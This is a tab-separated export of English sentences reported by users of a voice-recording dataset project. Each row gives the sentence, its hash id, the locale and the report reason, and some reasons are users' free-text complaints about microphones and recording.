sentence	sentence_id	locale	reason
Isn’t it so?	0ba72fffcbe47e9a1751fb462b083dbb58b0038a6b7333992b788359b96d47af	en	offensive-language
Isn’t it so?	0ba72fffcbe47e9a1751fb462b083dbb58b0038a6b7333992b788359b96d47af	en	different-language
The town of Hartennes was created during the French Revolution.	0b19dc8c0ed3a22981f9b6a2c0068072d07b5c575774f4513051d3ac89dd35b9	en	grammar-or-spelling
The town of Hartennes was created during the French Revolution.	0b19dc8c0ed3a22981f9b6a2c0068072d07b5c575774f4513051d3ac89dd35b9	en	difficult-pronunciation
The city’s plan is laid, the church’s position if fixed.	0c26a51e983607776583417b0a75417e20d514d16abcdf188a14d4b4262c1558	en	grammar-or-spelling
That was in this instance the case for erythropoietin.	0bdbe802a9790d51e60be6e1240b85fa176df12746d3c6e5a2df3d0947587722	en	grammar-or-spelling
That was in this instance the case for erythropoietin.	0bdbe802a9790d51e60be6e1240b85fa176df12746d3c6e5a2df3d0947587722	en	different-language
That was in this instance the case for erythropoietin.	0bdbe802a9790d51e60be6e1240b85fa176df12746d3c6e5a2df3d0947587722	en	offensive-language
That was in this instance the case for erythropoietin.	0bdbe802a9790d51e60be6e1240b85fa176df12746d3c6e5a2df3d0947587722	en	difficult-pronounce
He did not do any attempt to hide the light bulb.	0c253f55c70c259f1ccbfe31d1cb02bba7910aa3c0f7f8dc614e05659bb91cc3	en	offensive-language
Solidago pacifica Juz. is one species of Solidago genus in Compositae family.	0b3abdb45b08445d4f43f4fef9ead4f1beeaf7ebea6975148f6386f99e8048bb	en	grammar-or-spelling
He emigrated at the end of to Haiti then to Colombia.	0bfbe5548ead51a68d78cc11c4a99db04a1e371eb4062f6bedb3d03748493835	en	grammar-or-spelling
The city’s plan is laid, the church’s position if fixed.	0c26a51e983607776583417b0a75417e20d514d16abcdf188a14d4b4262c1558	en	grammar-or-spelling
The domain was then returned to the Knights Hospitaliers.	0c86f720b3f2a7f7bafb1dab43e716f99af508217340c8c7eb6d720b657497af	en	grammar-or-spelling
The solution must be standardized.	352118c4c8dac52dd2206653e1e3d3759ea1807b27420a613f170735ef352815	en	offensive-language
The solution must be standardized.	352118c4c8dac52dd2206653e1e3d3759ea1807b27420a613f170735ef352815	en	grammar-or-spelling
The solution must be standardized.	352118c4c8dac52dd2206653e1e3d3759ea1807b27420a613f170735ef352815	en	different-language
The solution must be standardized.	352118c4c8dac52dd2206653e1e3d3759ea1807b27420a613f170735ef352815	en	difficult-pronounce
The leery lawyer simply stepped inside.	40555e5d3fd35e924685a1d7d8ecb4950cf5a95afcc5cbc6690ded10a8bcb493	en	offensive-language
I'll take and bounce a rock offa your head.	4936f4d10481ae664ee432c99cfd174b2e49efe3ee5051f81b5be7c94037ff4a	en	grammar-or-spelling
The hippo caught him in its mouth and killed him by one crunch.	10c1e3599e2b788a42a277c182676d1f7f4c3d09a1ccf6cbec65411388e56d19	en	grammar-or-spelling
I don't want to put you in Dutch with your fleet.	6d00420b2cde13a9f8f58445c196d67fa2115ef731647bab07722d2e4bb318f6	en	grammar-or-spelling
The pilgrim hastens to the van at the end of the train.	1797f57dca0c54b11b358036e586cefc3f0c8ca525f76926b90fe4ebddf64247	en	different-language
The pilgrim hastens to the van at the end of the train.	1797f57dca0c54b11b358036e586cefc3f0c8ca525f76926b90fe4ebddf64247	en	difficult-pronunciation
She was so overflowing with health and spirits, so fearless and uncaring.	8d748515b99259952a55c0306991dbb7393b30f3bc4e7104620ac0f1d9c9f822	en	offensive-language
She was so overflowing with health and spirits, so fearless and uncaring.	8d748515b99259952a55c0306991dbb7393b30f3bc4e7104620ac0f1d9c9f822	en	grammar-or-spelling
She was so overflowing with health and spirits, so fearless and uncaring.	8d748515b99259952a55c0306991dbb7393b30f3bc4e7104620ac0f1d9c9f822	en	different-language
She was so overflowing with health and spirits, so fearless and uncaring.	8d748515b99259952a55c0306991dbb7393b30f3bc4e7104620ac0f1d9c9f822	en	difficult-pronunciation
She was so overflowing with health and spirits, so fearless and uncaring.	8d748515b99259952a55c0306991dbb7393b30f3bc4e7104620ac0f1d9c9f822	en	text
Following the war "Kennison" sailed for the East Coast, arriving Norfolk late October.	978df8d08125ca093fd21c2c0158df7150734a03b9306334238aa0975e32bf3f	en	grammar-or-spelling
However, in the meanwhile the Franco-Prussian War broke out.	97b07043bb3e19617451e1615e5eb3eefe87df4f1e1f04531ece11ecda0af55b	en	grammar-or-spelling
Also peculiar is the Devil hovering besides Judas.	97a1da0ae10ab2362833faff64e145068b9310937f72c911d2ee83480e08c668	en	grammar-or-spelling
His brother Hector is songwriter and guitarist for the band Injuns.	97d09bd95fe393cb7ec980c9eefab508468e2bb110627b6481185f9f3cbf26c7	en	grammar-or-spelling
Nevertheless, the Frankfurt kitchen became a model for a modern work kitchen.	97d433fb94421fbffa6ebc408c89d56b046b564eebef10c1d604594c37c60b86	en	grammar-or-spelling
When the suckeris taken out a tiny blood mark appears on the surface.	4728a2087f1c1e92cf4403d70b0b4b10a29b0df0d2996439994b75cf99080b55	en	grammar-or-spelling
Without the axiom of choice, there would be cardinal numbers which were not well-orderable.	9802b01aea93f23ec1861ea7a9de5d293942ec33d8623634c75a595b1ce50753	en	offensive-language
The ultimate objective of the offensive was Arnhem.	9856156cecc8973196cdfafc2ede573c30849aa6c9015f09f3ef22d85a0e077e	en	grammar-or-spelling
The ultimate objective of the offensive was Arnhem.	9856156cecc8973196cdfafc2ede573c30849aa6c9015f09f3ef22d85a0e077e	en	Arnheim
C. Kings of Ya rtse.	985ee8e329efe9144bf92823c286b18b35d019f9d16d1b5fd7ee68db5783b2d3	en	difficult-pronounce
C. Kings of Ya rtse.	985ee8e329efe9144bf92823c286b18b35d019f9d16d1b5fd7ee68db5783b2d3	en	different-language
C. Kings of Ya rtse.	985ee8e329efe9144bf92823c286b18b35d019f9d16d1b5fd7ee68db5783b2d3	en	grammar-or-spelling
C. Kings of Ya rtse.	985ee8e329efe9144bf92823c286b18b35d019f9d16d1b5fd7ee68db5783b2d3	en	Not sure what this us
Experienced Fusebox developers vetting any changes which are submitted.	987086ca9e147c329da3b06976c0be88d78b1bfaf651aaf24eb48bf83e9d7146	en	grammar-or-spelling
Indeed, Allah is Knowing and Acquainte.	989e0c6ce73e88c0074cb753131ce65eac3bb6a2c885c6b7d2391cb8a9941287	en	grammar-or-spelling
The lowest section is the north end along Haight.	989327db58d2a8411960d469aa81d0358d5e7ea634126c88b20b57bf47686691	en	offensive-language
The lowest section is the north end along Haight.	989327db58d2a8411960d469aa81d0358d5e7ea634126c88b20b57bf47686691	en	grammar-or-spelling
The lowest section is the north end along Haight.	989327db58d2a8411960d469aa81d0358d5e7ea634126c88b20b57bf47686691	en	difficult-pronunciation
Good, he says, is the fulfilment of man's destiny, evil the thwarting of it.	98affd0eacd6927e18ebdee84373ca801d8ed01f6cae2886c50ec2abcb3f6125	en	offensive-language
Good, he says, is the fulfilment of man's destiny, evil the thwarting of it.	98affd0eacd6927e18ebdee84373ca801d8ed01f6cae2886c50ec2abcb3f6125	en	grammar-or-spelling
Good, he says, is the fulfilment of man's destiny, evil the thwarting of it.	98affd0eacd6927e18ebdee84373ca801d8ed01f6cae2886c50ec2abcb3f6125	en	different-language
Good, he says, is the fulfilment of man's destiny, evil the thwarting of it.	98affd0eacd6927e18ebdee84373ca801d8ed01f6cae2886c50ec2abcb3f6125	en	difficult-pronounce
Lugton eventually joined synth rock band Talk That Walk.	98cbae997308906805bf85439240f532f29407b338c7ede07d54f8831419785b	en	different-language
Lugton eventually joined synth rock band Talk That Walk.	98cbae997308906805bf85439240f532f29407b338c7ede07d54f8831419785b	en	difficult-pronunciation
The Sultan was appointed an Honorary Colonel of the force.	98d3a039e39ffaa0939a0bd23dff4b5b8262a223da9470ae3376478f253a65a6	en	different-language
The Sultan was appointed an Honorary Colonel of the force.	98d3a039e39ffaa0939a0bd23dff4b5b8262a223da9470ae3376478f253a65a6	en	difficult-pronunciation
The Sultan was appointed an Honorary Colonel of the force.	98d3a039e39ffaa0939a0bd23dff4b5b8262a223da9470ae3376478f253a65a6	en	text
What do you mean, Mr. Bennet, in talking this way?	990bb8044d564b58d0f52258ab31fd4994478bb9b1f95848d1123d6f6a16ecd4	en	grammar-or-spelling
Quickly, you will be, to.	9911e8c0475a72a3528c0be62394c0ea6b5dce1a76281a689c0ff2e437fadc8d	en	grammar-or-spelling
The town has a voluntary rural fire brigade staffed by locals.	9934222ad0615d72c30f04b8434faa105b1b394fac5b121a572ff79753606d8b	en	offensive-language
The album showed Wright in a more pop-driven styled than her previous work.	9935fcb34baaa8e3b433cf9eba705e7f702d2a911a3b874616b629d21379e909	en	grammar-or-spelling
The leaves are used as a flavouring or leafy vegetable.	997b66c9d8f379bac545a0bee6ab6f6adbbaae95d0869688e46564c59ead7c79	en	offensive-language
The leaves are used as a flavouring or leafy vegetable.	997b66c9d8f379bac545a0bee6ab6f6adbbaae95d0869688e46564c59ead7c79	en	grammar-or-spelling
The leaves are used as a flavouring or leafy vegetable.	997b66c9d8f379bac545a0bee6ab6f6adbbaae95d0869688e46564c59ead7c79	en	different-language
The leaves are used as a flavouring or leafy vegetable.	997b66c9d8f379bac545a0bee6ab6f6adbbaae95d0869688e46564c59ead7c79	en	difficult-pronunciation
The leaves are used as a flavouring or leafy vegetable.	997b66c9d8f379bac545a0bee6ab6f6adbbaae95d0869688e46564c59ead7c79	en	hello
It specifies the general information about a function like the name, scope and parameters.	99923f856e4e1e7320db6fed85ccfdc1eff98c0b1182c8dd8ef0b08a47ea024d	en	offensive-language
This is to reflect one of Soudal's key brands.	99928a9f370cc22515db66a2d2506686584c1aeffc03aef138e2530c9057bbe2	en	difficult-pronunciation
Some of the harsh citizens will speak ill of you, some bette.	99bc11e0e8cb5b7878cab238c39820047fd9789ef951fe552a210495fc23472d	en	grammar-or-spelling
The toolbar uninstaller does not function, instead re-installing the add-on if manually removed.	99b8535f38ad308ff3dad689ffefd6f0eadb88479b1522714aa66a634c0cd47f	en	grammar-or-spelling
For a few years worked as creative director with various international companies.	99e07652b8488c1411645647259025474b484a7252b92ab808ef5d2abea30b33	en	grammar-or-spelling
Lord Fairfax was styled "Lord General", none of his successors would uses this title.	99eb448104669649b77b87c8cb4a49cb99340ec09620afd9596230977937ae94	en	grammar-or-spelling
A minimum lot size of was established.	99ed11ee59d4d419a18211c9a5d88ea90f9dabeef2c6b15adcaaeca72f46d64e	en	grammar-or-spelling
Warmer winter ocean temperatures also promote outbreaks.	9a3cfe06137a039052c299b807374843e122a6681396f7a4e81e0f9b7c4889a9	en	offensive-language
Warmer winter ocean temperatures also promote outbreaks.	9a3cfe06137a039052c299b807374843e122a6681396f7a4e81e0f9b7c4889a9	en	grammar-or-spelling
Warmer winter ocean temperatures also promote outbreaks.	9a3cfe06137a039052c299b807374843e122a6681396f7a4e81e0f9b7c4889a9	en	different-language
Warmer winter ocean temperatures also promote outbreaks.	9a3cfe06137a039052c299b807374843e122a6681396f7a4e81e0f9b7c4889a9	en	difficult-pronounce
Warmer winter ocean temperatures also promote outbreaks.	9a3cfe06137a039052c299b807374843e122a6681396f7a4e81e0f9b7c4889a9	en	Fraud
Iori is a berserker due to the Orochi demon blood within him.	9a3a304341bed2ab31548682ea3a4f12ecb917730792a8b46ed6a70682f47fe3	en	grammar-or-spelling
"Don't shake your head," said Mr. Bucket.	9a651b2b11e649868ad1580dcfbbda77df5e47266f4d6118da646f1a42cc81d1	en	grammar-or-spelling
"Don't shake your head," said Mr. Bucket.	9a651b2b11e649868ad1580dcfbbda77df5e47266f4d6118da646f1a42cc81d1	en	Mister
His father, Mr. Bernard P. Fettman, is deceased.	9a4a50620383d6d335efd78ff06c74ca121d536d5322aa352a5377774ec6f87f	en	grammar-or-spelling
The Roman amphitheatre was considered mostly unsalvageable and unnecessary to rebuilt.	9a721e7d30dcdd4cc0d4d97c7441fa17dbb8bf8b994a4fd122ed77ba165f492b	en	grammar-or-spelling
It is a feeder school for A. Y. Jackson Secondary School.	9a946f62c42a0e9a8df0c8bb2af266cecf4c89600315af51c6475a6e830aedf3	en	different-language
It is a feeder school for A. Y. Jackson Secondary School.	9a946f62c42a0e9a8df0c8bb2af266cecf4c89600315af51c6475a6e830aedf3	en	difficult-pronunciation
Ukrainian and Russian population and Native Charitonians alike.	9a906f9eafdec756cc06fc3522eef0b7f9db574975da3fe5fa82d8d3b314b125	en	offensive-language
Ukrainian and Russian population and Native Charitonians alike.	9a906f9eafdec756cc06fc3522eef0b7f9db574975da3fe5fa82d8d3b314b125	en	grammar-or-spelling
Ukrainian and Russian population and Native Charitonians alike.	9a906f9eafdec756cc06fc3522eef0b7f9db574975da3fe5fa82d8d3b314b125	en	different-language
Ukrainian and Russian population and Native Charitonians alike.	9a906f9eafdec756cc06fc3522eef0b7f9db574975da3fe5fa82d8d3b314b125	en	difficult-pronunciation
Ukrainian and Russian population and Native Charitonians alike.	9a906f9eafdec756cc06fc3522eef0b7f9db574975da3fe5fa82d8d3b314b125	en	text
Recently, Ms. Roberts conducted workshops on singing and voice projection.	9ad0abb3b4703560fa1340e2a79767043194a9a0b6675fa3436845b500b8d3b6	en	grammar-or-spelling
The season was marked bt a major controversy at the end.	9a9b7c9eb84e4472e6ac6634bd24e1183592d4efceab47e1d96422220cd7309c	en	grammar-or-spelling
The Serbian government also does not have proper welfare system.	9b3354e0dc23606e2844645644c19f1f616372ccf69c28485b493e36b5d7c8db	en	grammar-or-spelling
Germany formally recognised its new western borders acted by the Treaty of Versailles.	9b2feb6d331947008d76d7dd8b34cc7d8842e386af8f4a0413f304d0f1a08d97	en	grammar-or-spelling
When used without a saddle, a surcingle sits just behind the withers.	9b51224ae8ed5c25f29e4718d3525ba43659bd6a299b9383b19a1fba18ed1eaf	en	offensive-language
Ferrimagnets have two sublattices with opposing moments.	9b7dfa6ac83cc0a1b707a4f5971bf8d4d7c82197e5c96ed012a6b0b783cf4bb2	en	difficult-pronounce
When used without a saddle, a surcingle sits just behind the withers.	9b51224ae8ed5c25f29e4718d3525ba43659bd6a299b9383b19a1fba18ed1eaf	en	difficult-pronounce
From Port Chicago she took supplies to Baltimore though the Panama Canal.	9b873974da50221bd48ddc4714b52f7afc7cd489bba01f2787690e3c7a852f74	en	grammar-or-spelling
He built an sixteen room timber hotel, which he named the Surfers Paradise Hotel.	9ba782b5407277c3f780265e21824b5168ef29f94fa829aaae9f1bbea112f07d	en	grammar-or-spelling
The turbocharged model will have and of torque in the North American model.	9b78f373c6aad9cde6ddf897f4839ba51954644c911635d4512a123a1a10bd30	en	grammar-or-spelling
The first structure to surpass a height of was the Old Saint Paul's Cathedral.	9b3333b028bcd269396db3f9d2d9dfa1123a6e422e2b6e492dacea1978705529	en	grammar-or-spelling
I only I said thought so.	9baf5d4ca760dd226f002169334939aec04782d546126825705798d159e1341c	en	grammar-or-spelling
Sodepur is well connected by the Eastern Railway suburban network.	9bb587815512c9b0153f8a90fcafb95752ad4be510dfd50a5438e65c6fc59be7	en	different-language
Sodepur is well connected by the Eastern Railway suburban network.	9bb587815512c9b0153f8a90fcafb95752ad4be510dfd50a5438e65c6fc59be7	en	difficult-pronounce
See also Sefton Delmer.	9bdc776db35e7630e5864512a5a9ef4516bc3bfd82a432c6ddd598ab572c675b	en	offensive-language
See also Sefton Delmer.	9bdc776db35e7630e5864512a5a9ef4516bc3bfd82a432c6ddd598ab572c675b	en	grammar-or-spelling
See also Sefton Delmer.	9bdc776db35e7630e5864512a5a9ef4516bc3bfd82a432c6ddd598ab572c675b	en	different-language
See also Sefton Delmer.	9bdc776db35e7630e5864512a5a9ef4516bc3bfd82a432c6ddd598ab572c675b	en	difficult-pronounce
They were persuaded not to do this by their mother.	9be6694acc270d0965bc76a435eee914eeec182de139a65c58b5551f884fa0ae	en	offensive-language
They were persuaded not to do this by their mother.	9be6694acc270d0965bc76a435eee914eeec182de139a65c58b5551f884fa0ae	en	grammar-or-spelling
They were persuaded not to do this by their mother.	9be6694acc270d0965bc76a435eee914eeec182de139a65c58b5551f884fa0ae	en	different-language
They were persuaded not to do this by their mother.	9be6694acc270d0965bc76a435eee914eeec182de139a65c58b5551f884fa0ae	en	difficult-pronounce
In Europe, Bols still manufactures grenadine with pomegranate.	9be03eecbbc5bc41df77430a06559fc92b486e33f1da3f7f77d0e3be7e429994	en	offensive-language
In Europe, Bols still manufactures grenadine with pomegranate.	9be03eecbbc5bc41df77430a06559fc92b486e33f1da3f7f77d0e3be7e429994	en	grammar-or-spelling
In Europe, Bols still manufactures grenadine with pomegranate.	9be03eecbbc5bc41df77430a06559fc92b486e33f1da3f7f77d0e3be7e429994	en	different-language
In Europe, Bols still manufactures grenadine with pomegranate.	9be03eecbbc5bc41df77430a06559fc92b486e33f1da3f7f77d0e3be7e429994	en	difficult-pronounce
The Coalition has no core funding and no political or corporate affiliations.	9be575b585441220201917fcc688240612958d7d0c7f3e39c4b7a1b189751019	en	offensive-language
The Coalition has no core funding and no political or corporate affiliations.	9be575b585441220201917fcc688240612958d7d0c7f3e39c4b7a1b189751019	en	grammar-or-spelling
The Coalition has no core funding and no political or corporate affiliations.	9be575b585441220201917fcc688240612958d7d0c7f3e39c4b7a1b189751019	en	different-language
The Coalition has no core funding and no political or corporate affiliations.	9be575b585441220201917fcc688240612958d7d0c7f3e39c4b7a1b189751019	en	difficult-pronounce
Organelles in the microbody family include peroxisomes, glyoxysomes, glycosomes and hydrogenosomes.	9b82c90978f93a981a0d6e1d53fa5b9c07fb5b8f5e4feae296bce09133ca1a9d	en	difficult-pronounce
What am I going to do?	9be1847f8f20218c0d97877fc55c17cf444a658ae46942eca0ef8bf6813f9c86	en	offensive-language
What am I going to do?	9be1847f8f20218c0d97877fc55c17cf444a658ae46942eca0ef8bf6813f9c86	en	grammar-or-spelling
What am I going to do?	9be1847f8f20218c0d97877fc55c17cf444a658ae46942eca0ef8bf6813f9c86	en	different-language
What am I going to do?	9be1847f8f20218c0d97877fc55c17cf444a658ae46942eca0ef8bf6813f9c86	en	difficult-pronunciation
What am I going to do?	9be1847f8f20218c0d97877fc55c17cf444a658ae46942eca0ef8bf6813f9c86	en	haik
It was dependent on Vee-Jay Records for both masters and sleeves.	9c39ea35a5721b037c48ea98dfda11ea8814e35e057a8c656d2dc45430316511	en	The first sentence recording went ok.  After that, the error message that the recording was too quiet kept coming up, and the recording was not completed.  I don't know what to do.
Take My Life...Please!	9c45461b38c5663f824116379f8302526db407ff520fc4a6b8ad3bcbae7d5a53	en	offensive-language
I shall not tell you again.	9c53dbf44d48ad7caee898654155e50caebbec48f4a714d20f77b92a987b95bd	en	different-language
A granite marker in the Heritage Airpark on the base commemorates the event.	9c488dad446ed0d953beb852f716e0530acad843e8528e61811d3fb901f81ff9	en	difficult-pronounce
Pomology has been an important area of research for centuries.	9cc013488e8dc200765a26d6274337eb4669f094cee6c5ac570c06594f846e7d	en	offensive-language
Pomology has been an important area of research for centuries.	9cc013488e8dc200765a26d6274337eb4669f094cee6c5ac570c06594f846e7d	en	grammar-or-spelling
Pomology has been an important area of research for centuries.	9cc013488e8dc200765a26d6274337eb4669f094cee6c5ac570c06594f846e7d	en	different-language
Pomology has been an important area of research for centuries.	9cc013488e8dc200765a26d6274337eb4669f094cee6c5ac570c06594f846e7d	en	difficult-pronounce
The bill reached only second reading before it died on the order paper.	9d07f902dea2d539049db249bb40daadd0921c00b5df7d83c6633395dc360005	en	grammar-or-spelling
For a while Boost was advertised on television by comedy duo Reeves and Mortimer.	9d2e7a12934ded2dd1cecfd51346c547cfe71d67f600dbf5de8b135bef1690db	en	difficult-pronounce
Many "City Journal" articles focus on urban policy.	9d2fc3ffd873d6ea0d63cf27d510320c7582e09679022052da4695428a6e1ee4	en	different-language
The level of Lake Managua raises significantly during the periods of heavy rain.	9ddbdabd4b78c9568dba8febfd85ae780c12b7c0b1123d7ac7aaf7311d5e8594	en	grammar-or-spelling
He was born in Chicago, and was educated at Loras College in Dubuque, Iowa.	9de09159b7fbfe0dffcc2e282e415ca6ce7388f48162284c81ca8023e9011dc7	en	Out of sequence. 
Tomislav received and protected the Serbs who were expelled by Simeon from Rascia.	9de141fff4a20ce06c1380a092b53c672460d5f4068dfc47dc35e50c0fd98926	en	difficult-pronounce
Frankie apparently socialized with the frogs and was puzzled by Louie's animosity towards them.	9de4d4088f60622a89a6440e93f3eca498155fe9ee14d5bed5e7c1bd3827baae	en	different-language
She became the superintendent of the Seminole Nation's girls' school, Emahaka.	9e0a7eafe6df7819e6baee532739829a567a0191e56908dc4512b5ee39edae80	en	different-language
He was physically unattractive, being overly thin and having a large nose.	9e3ee6e157c7a2451fd52eb6aabecf52552e8ebd6154f9b9fee33f49ad6cf1b7	en	It says turn on microphone, how.?
This system was abolished after the French Revolution.	9e7b1f697db75aff03d4a63ff979cc232f123fc27e96a37a7cbc924b862644be	en	difficult-pronounce
This system was abolished after the French Revolution.	9e7b1f697db75aff03d4a63ff979cc232f123fc27e96a37a7cbc924b862644be	en	different-language
This system was abolished after the French Revolution.	9e7b1f697db75aff03d4a63ff979cc232f123fc27e96a37a7cbc924b862644be	en	grammar-or-spelling
This system was abolished after the French Revolution.	9e7b1f697db75aff03d4a63ff979cc232f123fc27e96a37a7cbc924b862644be	en	offensive-language
They are often the largest teeth in a mammal's mouth.	9ec31168a03cab2cbde21e3d10ecea8f8d927b6e234173b8b48c4dc4cab16f8d	en	It is not recording.. It is just saying I should allow my microphone ,but I've already allowed it
Examples include -dimensional vector spaces and manifolds, geometries and fibre bundles.	9f477a9539594e3d408251785703a539635f332188f6d69e07e6e8888c2d3506	en	grammar-or-spelling
A few days later Hopton surrendered at Tresillian Bridge near Truro.	9f719ae864d2e9c8a865b550162aab92d93cd546c5fe1ed327a9f70709256211	en	Devise is not working
Beneath her upperworks, the round-bottomed hull is wide and long.	9f6ffe509464cb357c5de9dc5958eb5b489a93c487a1136a162484b9e88e0132	en	Not sure the directions to speak/record were easy enough to understand directions. Tried!
When he was in grade school, Pinnick participated in choir and played saxophone.	9f8f2ebfa3152b9825d0f3b0ac56dcf0be4e8e417d78ddd24a068d50db98a281	en	Was my voice heard?
Her tree-house dwelling was apparently the epicenter of the entire Plateau.	9f8b8df5f2f5a6c8171607548c1297504d6648a7fde818148a165eeaf700d850	en	Not sure my voice was actually recorded. "Submit" was not high-lighted
Exposure may be by ingestion, inhalation, injection, or direct contact.	9f85400a4f547eb856e901f8a627fa7cb04b3ddbf2909efc852a71ac1a593ef6	en	offensive-language
Exposure may be by ingestion, inhalation, injection, or direct contact.	9f85400a4f547eb856e901f8a627fa7cb04b3ddbf2909efc852a71ac1a593ef6	en	grammar-or-spelling
Exposure may be by ingestion, inhalation, injection, or direct contact.	9f85400a4f547eb856e901f8a627fa7cb04b3ddbf2909efc852a71ac1a593ef6	en	different-language
Exposure may be by ingestion, inhalation, injection, or direct contact.	9f85400a4f547eb856e901f8a627fa7cb04b3ddbf2909efc852a71ac1a593ef6	en	difficult-pronounce
Two years later, he was recorded as operating against Kazan.	9f7e3924676c28e119e36e5b2cdf88c79868ecf55610961908e1bdbf4d9271c3	en	I was told the recording was too quiet.  I am using a Windows PC laptop with the microphone enabled for you, but it shows zero when I do a microphone check.  I've never used this computer to record before.  Maybe I've got some sort of setting to adjust?

The Serbian Orthodox Eparchy of Eastern America is headquartered in Warren Township.	9f79abc85a1b5707344850802c6a674e6aeee8aa152d05c87d6b3093843b56fc	en	Okay.  I think you need to tell people they actually have to have a plug-in microphone to do this.  I usually use an Ipad and it has its own microphone, but your program wouldn't run on it.  So, without a physical plug-in microphone, I guess I can't take 
The is updated regularly with new editions appearing every four or five years.	9fb036e2437b23e754fe44b2f314831f6a303651144b6193863c68a26f31c5c1	en	grammar-or-spelling
Both versions have a supercharged straight-six engine that produced and of torque.	9fc6bfb4c772aeb30f5860df7d37dfd8e3c6613008f2c928db19affe1770634b	en	grammar-or-spelling
He then tried running into other classes were teachers refused to keep him there.	9fd4c50b487a49c73a6752f1754d39bdafcbed0529c15467ef3b37de0c8107b9	en	grammar-or-spelling
Ghalib must be the only poet who had biggest number of Stage portrayals.	9fad7fe37db7dfb9a45c83627d785f24aa203f4fb6299591f1181d91c4cd87d4	en	grammar-or-spelling
Males are larger than females and are long, with an tail when full-grown.	9fd097ed52464ba4daf5a36cbe424da8a51cbf804a8ef5acf6ff172dafa39cbb	en	grammar-or-spelling
Most departments and research center are in here.	a077b471f5a738158d8fe78e768beb0d1a00f3cb1e4c78b4661783123cff0423	en	grammar-or-spelling
Poteat's cousin, Justin Watts, is professional basketball player.	a09ea8d26da700117264f062ece9ee8c3c5244a24171a8fde8de73dbd6c5dddb	en	grammar-or-spelling
Every compact set is K-analytic so that there are non-separable K-analytic spaces.	a0b467ff2486b56235d6ab255f9eebdccd53534f7004da5fafc42717f2c1b832	en	offensive-language
Every compact set is K-analytic so that there are non-separable K-analytic spaces.	a0b467ff2486b56235d6ab255f9eebdccd53534f7004da5fafc42717f2c1b832	en	grammar-or-spelling
Every compact set is K-analytic so that there are non-separable K-analytic spaces.	a0b467ff2486b56235d6ab255f9eebdccd53534f7004da5fafc42717f2c1b832	en	different-language
Every compact set is K-analytic so that there are non-separable K-analytic spaces.	a0b467ff2486b56235d6ab255f9eebdccd53534f7004da5fafc42717f2c1b832	en	difficult-pronounce
The area was originally inhabited by the Tataviam Indians.	a09ad4990f0451cfbf3b5ec90ba9bd5dbb48aa98ed30409670a7578e83ebacb1	en	offensive-language
The area was originally inhabited by the Tataviam Indians.	a09ad4990f0451cfbf3b5ec90ba9bd5dbb48aa98ed30409670a7578e83ebacb1	en	grammar-or-spelling
The area was originally inhabited by the Tataviam Indians.	a09ad4990f0451cfbf3b5ec90ba9bd5dbb48aa98ed30409670a7578e83ebacb1	en	different-language
The area was originally inhabited by the Tataviam Indians.	a09ad4990f0451cfbf3b5ec90ba9bd5dbb48aa98ed30409670a7578e83ebacb1	en	difficult-pronounce
The area was originally inhabited by the Tataviam Indians.	a09ad4990f0451cfbf3b5ec90ba9bd5dbb48aa98ed30409670a7578e83ebacb1	en	Urdu 
They emerged during a time where society, the arts and people were changing quickly.	a0e9f7d118ec7c8aa744f9c3f60ed0ecc67f38a493dda1d7dbd56cc8192e8e75	en	Not bad. 
‘Speak lower, Mary — What is the matter?’ said Mr. Linton.	a14d45424656e63f40034d6fa0c4b1c6e47a897f69c86470a332ce1e7a9d7fb4	en	grammar-or-spelling
See notes form more information.	a165c7959f11aec3b914807a934a81dec5ae244149b93ca9fdfa18f25d2888dc	en	grammar-or-spelling
The band also headlined The Rush!	a18ee0555287218ff4e2ad3eebd0c1529b8555cec640452e0cf659ef229905d8	en	different-language
The relatively small submarine was an experimental missile-carrying submarine with a diesel engine.	a224a7f3979056776c1ad4abb7048a733d4328d2195c1a7f2703829107096755	en	Pay South African fnb bank linked with this phone
English translations of his articles are occasionally published in the "Taipei Times".	a1f964d60cdc22075494731d8a598bdfa08234d75c6bb5a3ebf20de9da936416	en	different-language
The Brownsville Area School District serves children living in Luzerne Township.	a2615f9e8922656d32c1abf03871eb4d4376abf29ad00f46d5349fe49170de46	en	difficult-pronounce
In algebraic chess notation, ?	a2a73cde2c162ff9a7f14da8ee8b77534e64800f4614cda37d0b316d497968aa	en	grammar-or-spelling
During his career, much was apparently made of Childs' pudgy appearance.	a2ba97a149e351feded152c2b48d343a04fb3627bd3c3d9ecee37006a31fa5e1	en	testing
As the name implies the gum is flavored with the spearmint plant.	a2c6974d6614257a7db6e2ad8a426fe39a57483ec342d910a70d846bf3653fb3	en	different-language
As the name implies the gum is flavored with the spearmint plant.	a2c6974d6614257a7db6e2ad8a426fe39a57483ec342d910a70d846bf3653fb3	en	test
